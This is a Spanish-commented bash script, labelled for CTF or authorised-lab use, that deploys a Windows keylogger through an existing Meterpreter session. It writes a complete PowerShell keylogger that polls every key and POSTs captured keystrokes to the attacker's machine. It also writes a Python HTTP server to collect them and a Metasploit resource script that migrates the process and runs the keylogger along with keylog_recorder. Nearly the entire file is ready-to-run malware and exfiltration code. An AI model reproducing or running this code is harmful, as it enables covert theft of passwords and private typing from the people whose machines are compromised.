#!/bin/bash
#===============================================================
# Keylogger Auto-Deploy para CTF / Lab Autorizado
# Uso: ./keylogger_deploy.sh <SESSION_ID>
#===============================================================

set -e

SESSION_ID="${1:-1}"
KALI_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1)
PUERTO=8080
WORK_DIR="$HOME/.keylogger_lab"
OUTPUT_FILE="$WORK_DIR/keystrokes.txt"

if [ -z "$KALI_IP" ]; then
    echo "[!] No se pudo detectar IP de Kali. Especifica manualmente:"
    read -p "IP de Kali: " KALI_IP
fi

echo "[+] IP detectada: $KALI_IP"
echo "[+] Sesión Meterpreter objetivo: $SESSION_ID"

# Crear directorio de trabajo
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

#===============================================================
# 1. SERVIDOR HTTP EN KALI (recibe las keystrokes)
#===============================================================
cat > servidor_kali.py << 'PYEOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, datetime, os

PORT = 8080
LOG_FILE = os.path.expanduser("~/.keylogger_lab/keystrokes.txt")

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        datos = urllib.parse.parse_qs(post_data.decode())
        keystrokes = datos.get('keys', [''])[0]

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        linea = f"[{timestamp}] {keystrokes}"

        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(linea + '\n')

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    print(f"[+] Servidor HTTP escuchando en 0.0.0.0:{PORT}")
    print(f"[+] Guardando keystrokes en: {LOG_FILE}")
    print(f"[+] Presiona Ctrl+C para detener\n")
    HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
PYEOF

#===============================================================
# 2. PAYLOAD POWERSHELL (keylogger para Windows)
#===============================================================
cat > keylogger.ps1 << "PSEOF"
$ipKali = "$KALI_IP"
$puerto = 8080
$intervalo = 8

$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
$API = Add-Type -MemberDefinition $signature -Name 'Keypress' -Namespace API -PassThru

$buffer = ""
$ultimoEnvio = Get-Date
$mapaTeclas = @{
    13 = "[ENTER]"; 8 = "[BACK]"; 9 = "[TAB]"; 27 = "[ESC]"
    32 = "[SPACE]"; 37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"
    40 = "[DOWN]"; 160 = "[SHIFT]"; 162 = "[CTRL]"; 164 = "[ALT]"
    91 = "[WIN]"; 46 = "[DEL]"; 36 = "[HOME]"; 35 = "[END]"
}

function Enviar-Buffer {
    if ($buffer -eq "") { return }
    try {
        $body = @{keys = $buffer}
        Invoke-WebRequest -Uri "http://`$ipKali`:$puerto" -Method POST -Body $body -UseBasicParsing -TimeoutSec 3 | Out-Null
        $script:buffer = ""
    } catch {}
}

while ($true) {
    Start-Sleep -Milliseconds 35
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $estado = $API::GetAsyncKeyState($ascii)
        if ($estado -eq -32767) {
            if ($mapaTeclas.ContainsKey($ascii)) {
                $tecla = $mapaTeclas[$ascii]
            } elseif ($ascii -ge 32 -and $ascii -le 126) {
                $tecla = [char]$ascii
            } else {
                $tecla = "[$ascii]"
            }
            $buffer += $tecla
        }
    }
    if ((New-TimeSpan -Start $ultimoEnvio -End (Get-Date)).TotalSeconds -ge $intervalo) {
        Enviar-Buffer
        $ultimoEnvio = Get-Date
    }
}
PSEOF

#===============================================================
# 3. RESOURCE SCRIPT PARA METASPLOIT
#===============================================================
cat > deploy.rc << RCEOF
<ruby>
run_single("use post/windows/manage/migrate")
run_single("set SESSION $SESSION_ID")
run_single("set PID 0")
run_single("run")
run_single("sleep 2")

run_single("use post/windows/manage/execute_script")
run_single("set SESSION $SESSION_ID")
run_single("set SCRIPT keylogger.ps1")
run_single("run")

run_single("sleep 3")
run_single("use post/windows/capture/keylog_recorder")
run_single("set SESSION $SESSION_ID")
run_single("set TIMEOUT 60")
run_single("run")
</ruby>
RCEOF

#===============================================================
# 4. EJECUCIÓN
#===============================================================
echo ""
echo "=========================================="
echo "  KEYLOGGER DEPLOY - LAB AUTORIZADO"
echo "=========================================="
echo ""

# Limpiar archivo anterior
> "$OUTPUT_FILE"

# Iniciar servidor HTTP en background
echo "[+] Iniciando servidor HTTP en Kali (puerto $PUERTO)..."
python3 "$WORK_DIR/servidor_kali.py" &
SERVER_PID=$!
sleep 2

echo "[+] Servidor corriendo con PID: $SERVER_PID"
echo "[+] Keystrokes se guardarán en: $OUTPUT_FILE"
echo ""
echo "[+] Ejecutando resource script en Metasploit..."
echo "    msfconsole -r $WORK_DIR/deploy.rc"
echo ""

# Ejecutar msfconsole con el resource script
msfconsole -q -r "$WORK_DIR/deploy.rc" 2>/dev/null || {
    echo "[!] msfconsole no disponible o sesión no encontrada."
    echo "[!] Asegúrate de tener una sesión activa con ID: $SESSION_ID"
    kill $SERVER_PID 2>/dev/null
    exit 1
}

echo ""
echo "[+] Post-explotación completada."
echo "[+] Revisando capturas..."
sleep 2

if [ -s "$OUTPUT_FILE" ]; then
    echo ""
    echo "=========================================="
    echo "  CAPTURA DE TECLADO (PowerShell)"
    echo "=========================================="
    cat "$OUTPUT_FILE"
else
    echo "[!] No hay datos del keylogger PowerShell aún."
    echo "    (Puede que la víctima no haya escrito nada)"
fi

echo ""
echo "[+] También revisa el loot nativo de Metasploit en:"
echo "    ~/.msf4/loot/"
echo ""
echo "[+] Presiona Enter para detener el servidor HTTP y salir..."
read
echo "[+] Deteniendo servidor HTTP..."
kill $SERVER_PID 2>/dev/null

echo "[+] Listo. Archivo final: $OUTPUT_FILE"
